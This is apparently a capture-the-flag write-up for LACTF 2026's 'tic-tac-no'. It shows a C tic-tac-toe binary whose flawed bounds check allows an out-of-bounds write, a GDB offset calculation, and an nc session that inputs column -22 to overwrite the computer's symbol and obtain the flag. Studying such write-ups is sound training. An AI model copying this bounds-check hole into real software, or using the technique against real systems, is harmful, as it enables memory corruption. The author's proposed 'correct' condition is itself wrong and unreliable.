---
title: "LACTF 2026: tic-tac-no"
date: "2026-02-09"
description: 'Writeup for the "tic-tac-no" Pwn challenge in the LACTF 2026.'
---

# LACTF 2026: tic-tac-no

#### February 9, 2026

This Pwn challenge gives us a binary (and its code). The binary is a classic Tic-Tac-Toe implementation. This is a solved game which can always be tied with perfect play, and this binary contains an algorithm to do just that. Our goal is to somehow win against the algorithm, even though it shouldn't really be possible. Here's the full code:

```
#include <stdio.h>
#include <stdbool.h>
#include <string.h>

char board[9];
char player = 'X';
char computer = 'O';
void initializeBoard();
void printBoard();
int checkWin();
int checkFreeSpaces();
void playerMove();
void perfectComputerMove();
int minimax(char board[9], int depth, bool isMaximizing);

int main() {
   setbuf(stdout, NULL);
   char winner = ' ';
   char response = ' ';
   printf("You want the flag? You'll have to beat me first!");
   for (int i = 0; i < 9; i++) {
         board[i] = ' ';
   }

   while (winner == ' ' && checkFreeSpaces() != 0) {
      printBoard();

      playerMove();
      winner = checkWin();
      if (winner != ' ' || checkFreeSpaces() == 0) {
         break;
      }

      perfectComputerMove();
      winner = checkWin();
      if (winner != ' ' || checkFreeSpaces() == 0) {
         break;
      }
   }

   printBoard();
   if (winner == player) {
      printf("How's this possible? Well, I guess I'll have to give you the flag now.\n");
      FILE* flag = fopen("flag.txt", "r");
      char buf[256];
      fgets(buf, 256, flag);
      buf[strcspn(buf, "\n")] = '\0';
      puts(buf);
   }
   else {
      printf("Nice try, but I'm still unbeatable.\n");
   }

   return 0;
}

void printBoard() {
   printf("\n");
   printf(" %c | %c | %c \n", board[0], board[1], board[2]);
   printf("---|---|---\n");
   printf(" %c | %c | %c \n", board[3], board[4], board[5]);
   printf("---|---|---\n");
   printf(" %c | %c | %c \n", board[6], board[7], board[8]);
   printf("\n");
}

int checkFreeSpaces() {
   int freeSpaces = 0;
   for (int i = 0; i < 9; i++) {
      if (board[i] == ' ') {
         freeSpaces++;
      }
   }
   return freeSpaces;
}

void playerMove() {
   int x, y;
   do{
      printf("Enter row #(1-3): ");
      scanf("%d", &x);
      printf("Enter column #(1-3): ");
      scanf("%d", &y);
      int index = (x-1)*3+(y-1);
      if(index >= 0 && index < 9 && board[index] != ' '){
         printf("Invalid move.\n");
      }else{
         board[index] = player; // Should be safe, given that the user cannot overwrite tiles on the board
         break;
      }
   }while(1);
}

int checkWin() {
   for (int i = 0; i < 3; i++) {
      if (board[3*i] == board[3*i+1] && board[3*i] == board[3*i+2] && board[3*i] != ' ')
         return board[3*i];
   }
   for (int i = 0; i < 3; i++) {
      if (board[i] == board[3+i] && board[i] == board[6+i] && board[i] != ' ')
         return board[i];
   }
   if (board[0] == board[4] && board[0] == board[8] && board[0] != ' ')
      return board[0];
   if (board[2] == board[4] && board[2] == board[6] && board[2] != ' ')
      return board[2];

   return ' ';
}

int minimax(char board[9], int depth, bool isMaximizing) {
   int result = checkWin();

   if (result == computer) return 10 - depth;
   if (result == player) return -10 + depth;
   if (checkFreeSpaces() == 0) return 0;

   if (isMaximizing) {
      int bestScore = -1000;
      for (int i = 0; i < 9; i++) {
         if (board[i] == ' ') {
            board[i] = computer;
            int score = minimax(board, depth + 1, false);
            board[i] = ' ';
            if (score > bestScore) {
               bestScore = score;
            }
         }
      }
      return bestScore;
   }
   else {
      int bestScore = 1000;
      for (int i = 0; i < 9; i++) {
         if (board[i] == ' ') {
            board[i] = player;
            int score = minimax(board, depth + 1, true);
            board[i] = ' ';
            if (score < bestScore) {
               bestScore = score;
            }
         }
      }
      return bestScore;
   }
}

void perfectComputerMove() {
   int bestScore = -1000;
   int move = -1;

   for (int i = 0; i < 9; i++) {
      if (board[i] == ' ') {
         board[i] = computer;
         int score = minimax(board, 0, false);
         board[i] = ' ';

         if (score > bestScore) {
            bestScore = score;
            move = i;
         }
      }
   }
   board[move] = computer;
}
```

That's quite some code. However, we don't need to look into most of it, for now at least. For Pwn challenges, even before completely understanding the environment of the binary, one of the first things I do is looking for leaks or potential overflows. This narrows down our search to just the functions that ask for input. In this case, it's only `playerMove`:

```
void playerMove() {
   int x, y;
   do{
      printf("Enter row #(1-3): ");
      scanf("%d", &x);
      printf("Enter column #(1-3): ");
      scanf("%d", &y);
      int index = (x-1)*3+(y-1);
      if(index >= 0 && index < 9 && board[index] != ' '){
         printf("Invalid move.\n");
      }else{
         board[index] = player; // Should be safe, given that the user cannot overwrite tiles on the board
         break;
      }
   }while(1);
}
```

This function makes a move for us. We give it a row and a column, for it to know what square we want to write an X in, and it places it in the board, which is a 3x3 array. From the looks of it, the `scanf` functions are properly called, meaning there's not a direct way of causing any overflow. However, there's a tiny detail that gives us the foothold to write outside this array:

```
if(index >= 0 && index < 9 && board[index] != ' '){
    printf("Invalid move.\n");
}
```

This snippet rules out invalid moves. It checks two things: 
- That the coordinates we gave it are valid (by translating them to the index of the array, and then checking if it the index is between 0 and 9)
- That said index is empty. In this Tic-Tac-Toe implementation, an empty square is represented with an empty space.

...or does it?

The condition logic is actually incorrect! Being like that, the move will only be invalid if BOTH conditions are met, which is wrong. In a proper implementation, a move is invalid even if one of the two conditions is true. The correct logic for the implementation would be the following:

```
if(index >= 0 && index < 9 || board[index] != ' '){ // Mind the OR!
    printf("Invalid move.\n");
}
```

## The vulnerability

This is our vulnerability, because it allows us to write outside the array. Actually, it's a limited vulnerability. It doesn't allow us to write arbitrary values in memory. Since our moves are made by writing an X into the board, the only thing we can do with this vulnerability is writing an X somewhere else. But worry not, this is enough for us to get the flag.

The next step should be to see where we can actually write. What's around the board in memory? Are we writing into the stack, or somewhere else?

Well, looking at the code, `board` is actually a global variable. So when we write into it, we aren't actually interacting with the stack, but with the `.data` section, which contains all global variables. So let's see what else is a global variable in our code.

```
char board[9];
char player = 'X';
char computer = 'O';
void initializeBoard();
void printBoard();
int checkWin();
int checkFreeSpaces();
void playerMove();
void perfectComputerMove();
int minimax(char board[9], int depth, bool isMaximizing);
```

These are all of them. Three variables and the other functions. In practice, not much, especially because there are only three global variables. But actually, this is more than enough! The gotcha of this challenge is realizing that we're able to change the computer's character into an X. This essentially makes the computer place Xs instead of Os, making it impossible to lose or draw the game, because we're the only player!

The way to exploit this isn't that difficult actually. We just need to find how far the board is to the `computer` in bytes (because`board` is a char array and we write bytes to it) and calculate what coordinates we need to get an index that corresponds to that offset, so instead of writing inside the board, we overwrite the `computer` variable for it to have an X instead of an O.
## Finding the offset

To find the offset I used our good old favorite tool, GDB. I have pwndbg integrated to it but it isn't necessary for this challenge.

First I added a breakpoint in main just to let the program initialize, and I started the program.

```
pwndbg> break main
pwndbg> run
```

Then I  used the `vmmap` command to see the different sections the binary has.

```
pwndbg> vmmap
0x555555554000     0x555555555000 r--p     1000       0 chall
0x555555555000     0x555555556000 r-xp     1000    1000 chall
0x555555556000     0x555555557000 r--p     1000    2000 chall
0x555555557000     0x555555558000 r--p     1000    2000 chall
0x555555558000     0x555555559000 rw-p     1000    3000 chall
0x7ffff7db2000     0x7ffff7db5000 rw-p     3000       0 [anon_7ffff7db2]
0x7ffff7db5000     0x7ffff7ddd000 r--p    28000       0 /usr/lib/x86_64-linux-gnu/libc.so.6
0x7ffff7ddd000     0x7ffff7f41000 r-xp   164000   28000 /usr/lib/x86_64-linux-gnu/libc.so.6
```

The `.data` section has read and write permissions, so `0x555555558000` seemed like an appropriate address for `.data` to be. So I dove a bit deeper:

```
pwndbg> x/15gx 0x555555558000
0x555555558000 <putchar@got.plt>:	0x0000555555555036	0x0000555555555046
0x555555558010 <setbuf@got.plt>:	0x0000555555555056	0x0000555555555066
0x555555558020 <strcspn@got.plt>:	0x0000555555555076	0x0000555555555086
0x555555558030 <fopen@got.plt>:	0x0000555555555096	0x00005555555550a6
0x555555558040:	0x0000000000000000	0x0000555555558048
0x555555558050 <player>:	0x0000000000004f58	0x00007ffff7f9c5c0
0x555555558060 <completed.0>:	0x0000000000000000	0x0000000000000000
0x555555558070 <board+8>:	0x0000000000000000
```

Jackpot.

We now see how the global variables are structured in the `.data` section. There's a bit of an issue with the mapping because the `computer` variable is not displayed, but it's there. Both the `player` and `computer` variables are `char`s, one byte long. Looking at the address of `player`, we can see two non-null bytes:

```
pwndbg> x/2bx &player 
0x555555558050 <player>:	0x58	0x4f
```

These are ASCII characters, `X` and `O` respectively! Now we know what address we need to overwrite. If `0x555555558050` corresponds to the player character, `0x555555558051` corresponds to the computer character! Knowing that the board starts at address `0x555555558068`, in order to get the offset we just need to subtract the the `computer` address with the `board` address: `0x555555558051 - 0x555555558068 = -23`, meaning that the offset is -23 bytes. That's our index!
## Calculating the coordinates

Now we need to give the program the appropriate coordinates to generate an index of -23. The program uses `int index = (x-1)*3+(y-1)` to get the index, so assuming `x = 1`, we'll need `y = -22` to get an index of -23. That's all. We can connect to the server and use these values to get the flag.

```
$ nc chall.lac.tf 30001
You want the flag? You'll have to beat me first!
   |   |   
---|---|---
   |   |   
---|---|---
   |   |   

Enter row #(1-3): 1
Enter column #(1-3): -22

   |   |   
---|---|---
   | X |   
---|---|---
   |   |   

Enter row #(1-3): 1
Enter column #(1-3): 1

 X |   |   
---|---|---
   | X |   
---|---|---
   |   | X 

How's this possible? Well, I guess I'll have to give you the flag now.
lactf{th3_0nly_w1nn1ng_m0ve_1s_t0_p1ay}
```

Notice how I had to play one regular move to complete the game. But we managed to make the computer write an X instead of an O, making it impossible to draw. We beat the unbeatable algorithm! 
 